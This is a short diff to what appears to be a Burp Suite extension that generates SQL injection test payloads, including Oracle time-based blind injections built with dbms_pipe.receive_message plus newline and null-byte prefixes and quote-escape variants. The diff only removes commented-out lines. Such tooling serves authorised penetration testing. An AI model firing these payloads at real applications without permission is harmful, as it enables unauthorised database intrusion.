@@ -417,9 +417,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         listSQLi = []
         prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
-        #prefixes = ["", "\\n"]
         
-        #escapeChars = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
         escapeChars = ["", "'", "\\'", "\\\\'"]
 
         n1 = str(random.randint(10,70))
@@ -550,7 +548,6 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                     listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
-
                                     listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,1000) else null end from dual " + suffix + "\n")
                                     listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
